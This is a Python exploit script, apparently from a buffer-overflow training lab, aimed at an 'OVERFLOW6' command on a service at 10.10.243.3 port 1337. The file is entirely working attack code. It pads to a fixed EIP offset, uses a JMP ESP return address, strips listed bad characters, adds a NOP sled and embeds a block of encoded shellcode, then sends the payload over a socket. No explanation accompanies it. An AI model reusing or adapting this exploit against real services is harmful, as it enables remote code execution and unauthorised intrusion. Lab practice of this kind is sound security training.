import socket, struct

host, port = "10.10.243.3", 1337

command = b'OVERFLOW6 '
bad_chars = [
b'\x08',
b'\x2c',
b'\xad'
]
def p32(data):
        return struct.pack("<I",data)
jmp_esp = p32(0x625011DF)

all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

offset = 1034
new_eip = b'BBBB'
length = 1500
shellcode =  b""
shellcode += b"\xba\x23\x9a\xc7\xf7\xda\xce\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc"
shellcode += b"\x03\x75\x94\x25\x02\x85\x40\x2b\xed\x75\x91"
shellcode += b"\x4c\x67\x90\xa0\x4c\x13\xd1\x93\x7c\x57\xb7"
shellcode += b"\x1f\xf6\x35\x23\xab\x7a\x92\x44\x1c\x30\xc4"
shellcode += b"\x6b\x9d\x69\x34\xea\x1d\x70\x69\xcc\x1c\xbb"
shellcode += b"\x7c\x0d\x58\xa6\x8d\x5f\x31\xac\x20\x4f\x36"
shellcode += b"\xf8\xf8\xe4\x04\xec\x78\x19\xdc\x0f\xa8\x8c"
shellcode += b"\x56\x56\x6a\x2f\xba\xe2\x23\x37\xdf\xcf\xfa"
shellcode += b"\xcc\x2b\xbb\xfc\x04\x62\x44\x52\x69\x4a\xb7"
shellcode += b"\xaa\xae\x6d\x28\xd9\xc6\x8d\xd5\xda\x1d\xef"
shellcode += b"\x01\x6e\x85\x57\xc1\xc8\x61\x69\x06\x8e\xe2"
shellcode += b"\x65\xe3\xc4\xac\x69\xf2\x09\xc7\x96\x7f\xac"
shellcode += b"\x07\x1f\x3b\x8b\x83\x7b\x9f\xb2\x92\x21\x4e"
shellcode += b"\xca\xc4\x89\x2f\x6e\x8f\x24\x3b\x03\xd2\x20"
shellcode += b"\x88\x2e\xec\xb0\x86\x39\x9f\x82\x09\x92\x37"
shellcode += b"\xaf\xc2\x3c\xc0\xd0\xf8\xf9\x5e\x2f\x03\xfa"
shellcode += b"\x77\xf4\x57\xaa\xef\xdd\xd7\x21\xef\xe2\x0d"
shellcode += b"\xe5\xbf\x4c\xfe\x46\x6f\x2d\xae\x2e\x65\xa2"
shellcode += b"\x91\x4f\x86\x68\xba\xfa\x7d\xfb\xcf\xf1\x48"
shellcode += b"\xc3\xa7\x07\xb2\x10\x11\x81\x54\x3c\x71\xc7"
shellcode += b"\xcf\xa9\xe8\x42\x9b\x48\xf4\x58\xe6\x4b\x7e"
shellcode += b"\x6f\x17\x05\x77\x1a\x0b\xf2\x77\x51\x71\x55"
shellcode += b"\x87\x4f\x1d\x39\x1a\x14\xdd\x34\x07\x83\x8a"
shellcode += b"\x11\xf9\xda\x5e\x8c\xa0\x74\x7c\x4d\x34\xbe"
shellcode += b"\xc4\x8a\x85\x41\xc5\x5f\xb1\x65\xd5\x99\x3a"
shellcode += b"\x22\x81\x75\x6d\xfc\x7f\x30\xc7\x4e\x29\xea"
shellcode += b"\xb4\x18\xbd\x6b\xf7\x9a\xbb\x73\xd2\x6c\x23"
shellcode += b"\xc5\x8b\x28\x5c\xea\x5b\xbd\x25\x16\xfc\x42"
shellcode += b"\xfc\x92\x0c\x09\x5c\xb2\x84\xd4\x35\x86\xc8"
shellcode += b"\xe6\xe0\xc5\xf4\x64\x00\xb6\x02\x74\x61\xb3"
shellcode += b"\x4f\x32\x9a\xc9\xc0\xd7\x9c\x7e\xe0\xfd"
op_sled = b'\x90'*10
payload = b''.join([
command,
b'A'*offset,
jmp_esp,
op_sled,
shellcode,
b'C' * (length - offset - len(jmp_esp) - len(op_sled) - len(shellcode))
])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
